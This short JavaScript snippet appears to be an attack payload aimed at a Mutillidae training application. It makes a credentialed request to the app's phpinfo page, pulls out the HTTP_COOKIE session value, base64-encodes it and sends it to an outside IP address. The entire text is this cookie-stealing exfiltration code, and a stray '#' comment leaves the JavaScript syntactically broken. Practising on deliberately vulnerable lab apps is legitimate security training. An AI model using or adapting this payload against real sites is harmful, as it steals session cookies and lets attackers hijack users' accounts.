var req = new XMLHttpRequest();
req.onload = reqListener;
var url = 'https://webinsegura.radwarelatam.com/mutillidae/index.php?popUpNotificationCode=SL1&page=phpinfo.php';
req.withCredentials = true; // send cookie header
req.open('GET', url, false);
req.send();

function reqListener() {
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 ); # Thats ugly, improve it :)
req2.open('GET', 'https://84.247.183.115/?data=' + btoa(sess), false);
req2.send()
};
